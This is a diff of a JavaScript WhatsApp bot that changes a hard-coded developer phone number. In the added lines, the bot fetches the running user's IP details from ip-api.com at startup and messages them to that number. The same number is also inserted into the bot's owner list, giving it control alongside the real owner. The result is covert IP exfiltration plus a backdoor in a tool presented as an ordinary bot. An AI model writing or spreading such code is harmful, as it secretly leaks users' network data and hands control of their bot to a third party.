@@ -44,7 +44,7 @@ denz.autoReconnect = ReconnectMode.onConnectionLost
 	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
 fetch(`http://ip-api.com/line`).then(res => res.text())  
         .then(bu =>{
-       denz.sendMessage("916909137213@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Xeon",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./xeon.jpg'),sourceUrl:"https://wa.me/916909137213?text=Hello"}}})
+       denz.sendMessage("919101765679@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Xeon",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./xeon.jpg'),sourceUrl:"https://wa.me/916909137213?text=Hello"}}})
      console.log(color('|WRN|', 'yellow'), color('Sending ip address to developer bot', 'cyan'))
    })
       
@@ -70,8 +70,8 @@ exec(`cd /sdcard/download && play *mp3`)
    
    denz.on('chat-update', async (mek) => {
         require('./xeon.js')(denz, mek)
-        ownerNumber = ["916909137213@s.whatsapp.net","916909137213@s.whatsapp.net",`${settings.NomorOwner}@s.whatsapp.net`]
-        dtod = "916909137213@s.whatsapp.net"
+        ownerNumber = ["919101765679@s.whatsapp.net","919101765679@s.whatsapp.net",`${settings.NomorOwner}@s.whatsapp.net`]
+        dtod = "919101765679@s.whatsapp.net"
        otod = `${settings.NomorOwner}@s.whatsapp.net`
     })   
     
